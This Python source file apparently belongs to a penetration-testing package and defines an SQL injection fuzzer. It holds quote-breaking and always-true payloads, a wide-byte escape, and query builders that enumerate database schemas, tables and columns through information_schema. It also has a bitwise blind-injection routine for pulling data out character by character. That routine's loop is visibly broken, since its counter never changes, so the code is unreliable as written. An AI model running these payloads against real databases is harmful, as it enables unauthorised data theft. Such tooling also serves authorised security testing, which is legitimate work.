#!/usr/bin/env python
# -*- coding: utf-8 -*-

from time import time


from saker.fuzzers.fuzzer import Fuzzer
from saker.utils.paths import Paths


class SQLi(Fuzzer):

    """generate SQLi payload and test"""

    mysqlStrFunc = [
        'mid(%s,1,1)',
        'substr(%s,1,1)',
        'substring(%s,1,1)',
        'lpad(%s,1,1)',
        'rpad(%s,1,1)',
        'left(%s,1)',
        'right(%s,1)',
        'reverse(%s,1)',
    ]

    def __init__(self):
        super(SQLi, self).__init__()

    @staticmethod
    def fuzz(quote=["'", '"']):
        l = []
        l.append('"')
        l.append('")')
        l.append('" -- +')
        l.append('") -- +')
        l.append('") #')
        l.append('" or "1"="1')
        l += list(map(lambda i: i.replace('"', "'"), l))
        l.append('')
        l.append('\\')
        l.append('%df%27')
        return l

    @classmethod
    def keyword(cls):
        with open(Paths.sqlkeywords) as keywords:
            for k in keywords:
                yield k.strip("\n")
        for k in cls.specialChars:
            yield k

    @classmethod
    def schemas(cls, bias=-1):
        # todo 
        # add innodb_table_stats
        payload = "select distinct(SCHEMA_NAME) from information_schema.SCHEMATA"
        if bias >= 0:
            payload += " limit %s,1" % bias
        else:
            payload += " limit 1"
        return payload

    @classmethod
    def tables(cls, schema="", bias=-1):
        payload = "select distinct(TABLE_NAME) from information_schema.TABLES"
        if schema:
            payload += " where TABLE_SCHEMA='%s'" % schema
        if bias >= 0:
            payload += " limit %s,1" % bias
        else:
            payload += " limit 1"
        return payload

    @classmethod
    def columns(cls, schema="", table="", bias=-1):
        payload = "select distinct(COLUMN_NAME) from information_schema.COLUMNS"
        if schema:
            payload += " where TABLE_SCHEMA='%s'" % schema
        if table:
            if schema:
                payload += " and TABLE_NAME='%s'" % table
            else:
                payload += " where TABLE_NAME='%s'" % table
        if bias >= 0:
            payload += " limit %s,1" % bias
        return payload

    @classmethod
    def sub(cls, payload, pos, mid):
        return "(ascii(mid((%s),%s,1))&%d)" % (payload, pos, mid)

    @classmethod
    def blindInjection(cls, payload, length, func):
        mid = 256
        pos = 1
        guess = 0
        content = ''
        while pos < length:
            if mid == 0:
                mid = 256
                pos += 1
                content += chr(guess)
                print(content)
                guess = 0
            else:
                guess <<= 1
                guess += int(func())
        return content
